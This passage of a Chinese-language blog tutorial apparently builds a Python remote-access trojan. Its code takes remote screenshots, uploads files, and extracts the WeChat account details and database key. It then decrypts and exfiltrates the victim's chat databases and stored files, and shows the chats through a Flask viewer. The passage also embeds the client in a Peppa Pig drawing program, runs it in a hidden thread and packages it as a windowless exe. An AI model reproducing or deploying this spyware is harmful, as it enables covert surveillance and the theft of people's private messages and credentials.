</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214251.png alt=下载文件></p><h3 id=远程上传文件>远程上传文件</h3><p>在这一部分，整体的流程和上面的远程文件下载基本一致，就是将上方服务端和客户端的流程对调</p><p>这里就不过多介绍，代码是一样的</p><p>在此程序中使用 <code>put 文件名称</code> 的形式，告诉双方我需要进入上传文件的流程</p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png alt=上传文件></p><h3 id=远程获取屏幕截图>远程获取屏幕截图</h3><p>Python获取屏幕截图的方式很多，比如PIL中的ImageGrab模块、windows API、PyQt、pyautogui等等</p><p><a href=https://blog.csdn.net/c_lanxiaofang/article/details/126412158>参考文章</a></p><p>在此程序中使用了PIL中的ImageGrab模块，原因就是操作十分简单，缺点是效率较低，但是对于我们这个程序来说，几乎感觉不出差别</p><p>ImageGrab模块只需要两条命令就能搞定全屏截图，十分方便</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>im</span> <span class=o>=</span> <span class=n>ImageGrab</span><span class=o>.</span><span class=n>grab</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>im</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>
</span></span></code></pre></div><p>远程获取屏幕截图的整体流程和框架：</p><p>{% mermaid %}</p><p>graph TB</p><p>a[服务端发送截屏指令并进入截屏流程]&ndash;>b[客户端接收截屏指令并进入截屏流程]</p><p>b&ndash;>c[服务端发送&rsquo;start&rsquo;指令]</p><p>c&ndash;>d[客户端端接收&rsquo;start&rsquo;指令并截屏保存文件]</p><p>d&ndash;>f[进入get下载文件流程]</p><p>c&ndash;>f</p><p>f&ndash;>e[客户端删除截屏文件,双方退出截屏流程]</p><p>{% endmermaid %}</p><p>在此程序中，使用 <code>screen</code> 的方式告诉双方，我需要进行截屏的流程</p><p><strong>Server端screen函数：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>screen_shot</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;screen&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;截图失败&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Client端screen函数：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>screen_shot</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;screen&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 截图并发生到服务端  </span>
</span></span><span class=line><span class=cl>    <span class=n>im</span> <span class=o>=</span> <span class=n>ImageGrab</span><span class=o>.</span><span class=n>grab</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 截屏命名为当前时间  </span>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%Y-%m-</span><span class=si>%d</span><span class=s2> %H-%M-%S&#34;</span><span class=p>,</span> <span class=n>time</span><span class=o>.</span><span class=n>localtime</span><span class=p>())</span> <span class=o>+</span> <span class=s1>&#39;.png&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=n>im</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 删除本地截图  </span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214314.png alt=截屏>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214330.png alt=截取的图片拉取到本地></p><h3 id=获取微信数据>获取微信数据</h3><p>这里功能是基于Github开源项目：<a href=https://github.com/xaoyaoo/PyWxDump>PyWxDump</a></p><p>其提供了一系列获取微信数据信息、聊天记录等Python接口</p><p>利用这个python项目，可以很容易获取到微信数据</p><p>如获取微信基本信息：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_wechat_info</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 读取文件中的json数据</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;version_list.json&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>version_list</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 读取微信信息</span>
</span></span><span class=line><span class=cl>    <span class=n>wx_info</span> <span class=o>=</span> <span class=n>read_info</span><span class=p>(</span><span class=n>version_list</span><span class=p>,</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>str</span><span class=p>(</span><span class=n>wx_info</span><span class=p>)</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;[-]&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>wx_info</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>pid</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;pid&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>version</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;version&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>account</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;account&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>mobile</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;mobile&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>mail</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;mail&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>wxid</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;wxid&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;filePath&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;key&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>wechat_files</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span><span class=o>.</span><span class=n>parent</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    ================== wechat info ==================
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 进程号: </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 版本: </span><span class=si>{</span><span class=n>version</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 微信号: </span><span class=si>{</span><span class=n>account</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 手机号: </span><span class=si>{</span><span class=n>mobile</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 微信名: </span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 邮箱: </span><span class=si>{</span><span class=n>mail</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] 微信数据路径: </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] wxid: </span><span class=si>{</span><span class=n>wxid</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] key: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    ================== wechat info ==================
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>file_path</span><span class=p>,</span> <span class=n>key</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214347.png alt=获取微信基本信息></p><p>获取并解密微信数据库：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_wechat</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span><span class=p>,</span> <span class=n>key</span> <span class=o>=</span> <span class=n>get_wechat_info</span><span class=p>(</span><span class=n>conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_path</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=c1># 获取解密后的数据库路径</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_path</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 创建解密后的数据库文件夹</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 解密微信数据库</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;decrypt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;key&#34;</span><span class=p>:</span> <span class=n>key</span><span class=p>,</span>  <span class=c1># 密钥</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;db_path&#34;</span><span class=p>:</span> <span class=n>file_path</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Msg&#39;</span><span class=p>,</span>  <span class=c1># 数据库路径</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;out_path&#34;</span><span class=p>:</span> <span class=n>decrypted_path</span>  <span class=c1># 输出路径（必须是目录）</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>batch_decrypt</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=s2>&#34;key&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;db_path&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;out_path&#34;</span><span class=p>],</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 打包压缩解密后的数据库并发送到服务端</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_path</span> <span class=o>=</span> <span class=n>decrypted_path</span> <span class=o>+</span> <span class=s1>&#39;.zip&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_name</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span><span class=o>.</span><span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_dir</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>,</span> <span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  <span class=c1># 记录当前路径</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span><span class=o>.</span><span class=n>parent</span><span class=p>))</span>  <span class=c1># 切换到父目录</span>
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>zip_file_name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>  <span class=c1># 删除压缩包</span>
</span></span><span class=line><span class=cl>    <span class=n>shutil</span><span class=o>.</span><span class=n>rmtree</span><span class=p>(</span><span class=n>decrypted_path</span><span class=p>)</span>  <span class=c1># 删除解密后的数据库文件夹</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  <span class=c1># 切换回原路径</span>
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  <span class=c1># 接收服务端的确认信息</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;get_db_ok&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=c1># 打包压缩FileStorage文件夹并发送到服务端</span>
</span></span><span class=line><span class=cl>    <span class=n>file_storage_path</span> <span class=o>=</span> <span class=n>file_path</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>FileStorage&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_path</span> <span class=o>=</span> <span class=n>file_storage_path</span> <span class=o>+</span> <span class=s1>&#39;.zip&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_file_name</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span><span class=o>.</span><span class=n>name</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>zip_dir</span><span class=p>(</span><span class=n>file_storage_path</span><span class=p>,</span> <span class=n>zip_file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  <span class=c1># 记录当前路径</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>  <span class=c1># 切换到父目录</span>
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>zip_file_name</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>zip_file_path</span><span class=p>)</span>  <span class=c1># 删除压缩包</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  <span class=c1># 切换回原路径</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214356.png alt=获取微信聊天数据库></p><p>开启flask服务，查看微信聊天信息：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>flask_show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># 查看聊天记录</span>
</span></span><span class=line><span class=cl>    <span class=n>seg</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;[*] 请输入数据库分段号：&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;mode&#34;</span><span class=p>:</span> <span class=s2>&#34;dbshow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;msg_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Multi</span><span class=se>\\</span><span class=s1>de_MSG</span><span class=si>{</span><span class=n>seg</span><span class=si>}</span><span class=s1>.db&#39;</span><span class=p>,</span>  <span class=c1># 解密后的 MSG.db 的路径</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;micro_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>de_MicroMsg.db&#39;</span><span class=p>,</span>  <span class=c1># 解密后的 MicroMsg.db 的路径</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;media_path&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>db_path</span><span class=p>)</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>Multi</span><span class=se>\\</span><span class=s1>de_MediaMSG</span><span class=si>{</span><span class=n>seg</span><span class=si>}</span><span class=s1>.db&#39;</span><span class=p>,</span>  <span class=c1># 解密后的 MediaMSG.db 的路径</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filestorage_path&#34;</span><span class=p>:</span> <span class=n>local_file_storage_path</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>FileStorage&#34;</span>  <span class=c1># 文件夹 FileStorage 的路径（用于显示图片）</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1># 启动flask服务</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>g</span>
</span></span><span class=line><span class=cl>    <span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>,</span> <span class=n>template_folder</span><span class=o>=</span><span class=s1>&#39;./show_chat/templates&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 阻止flask在控制台输出日志</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span> <span class=o>=</span> <span class=n>logging</span><span class=o>.</span><span class=n>getLogger</span><span class=p>(</span><span class=s1>&#39;werkzeug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>setLevel</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>ERROR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>setLevel</span><span class=p>(</span><span class=n>logging</span><span class=o>.</span><span class=n>ERROR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.before_request</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>before_request</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MSG_ALL_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;msg_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MicroMsg_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;micro_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>MediaMSG_all_db_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;media_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>FileStorage_path</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;filestorage_path&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>g</span><span class=o>.</span><span class=n>USER_LIST</span> <span class=o>=</span> <span class=n>get_user_list</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=s2>&#34;msg_path&#34;</span><span class=p>],</span> <span class=n>args</span><span class=p>[</span><span class=s2>&#34;micro_path&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/shutdown&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>shutdown</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>shutdown_func</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;werkzeug.server.shutdown&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>shutdown_func</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=s1>&#39;Not running with the Werkzeug Server&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>shutdown_func</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Server shutting down...&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>register_blueprint</span><span class=p>(</span><span class=n>app_show_chat</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 查看聊天记录服务启动在 http://127.0.0.1:5000 &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214405.png alt=在浏览器中查看聊天记录></p><h2 id=木马程序>木马程序</h2><h3 id=peppa-pig>peppa-pig</h3><p>完成上面的几个功能就已经具备简单远控木马的特征了，接着就是需要将这个程序隐藏起来，让对方察觉不到这个程序的存在</p><p>我的思路是将这个远程控制的程序隐藏在其他应用中，并且以多线程或者多进程的方式异步的运行这个程序，并且在对方关闭应用之后，这个远程程序依旧能在后台运行</p><p>首先我找到一个利用海龟绘图绘制小猪佩奇的程序，程序是 <a href=https://github.com/jackfrued/Python-100-Days>Python-100-Days</a> 这个项目中，接着我将远控程序引入，以多线程的方式启动，最后将整个程序<a href=https://blog.csdn.net/weixin_43804047/article/details/119704965>打包成exe可执行程序</a></p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231201203844.png alt=绘制小猪佩奇程序>
添加多线程代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 多线程  </span>
</span></span><span class=line><span class=cl>    <span class=n>t1</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>peppa_pig</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>client_main</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t1</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=n>t2</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></div><p>使用pyinstaller打包</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>pyinstaller</span> <span class=o>-F</span> <span class=n>-w</span> <span class=n>-n</span> <span class=n>pig</span> <span class=n>-i</span> <span class=n>icon</span><span class=p>.</span><span class=py>ico</span> <span class=n>peppa_pig</span><span class=p>.</span><span class=py>py</span>
